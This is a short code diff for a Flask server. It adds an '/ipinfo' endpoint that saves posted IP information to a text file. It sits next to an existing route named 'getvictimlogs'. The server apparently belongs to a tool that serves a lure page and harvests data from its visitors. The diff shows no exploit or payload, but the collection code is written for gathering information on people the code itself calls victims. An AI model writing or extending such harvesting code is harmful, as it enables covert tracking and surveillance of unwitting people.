@@ -11,9 +11,23 @@ app = Flask(__name__)
 import logging
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
+
 @app.route('/')
 def index():
    return Response(open('index.html').read(), mimetype="text/html")
+@app.route('/ipinfo',methods=['POST'])
+def ipinfos():
+      iplogs = request.get_json()
+      ips = open('ipinfo.txt','a')
+      ips.write("\n")
+      ips.write(str(iplogs))
+      ips.write("\n")
+      ips.close()
+      print(Fore.GREEN  + Style.BRIGHT + "---------IP Info Saved Successfully----------")
+      print(" ")
+      results = {'processed': 'true'}
+      return jsonify(results) 
+
 @app.route('/process_qtc', methods=['POST', 'GET'])
 def getvictimlogs():
   if request.method == "POST":
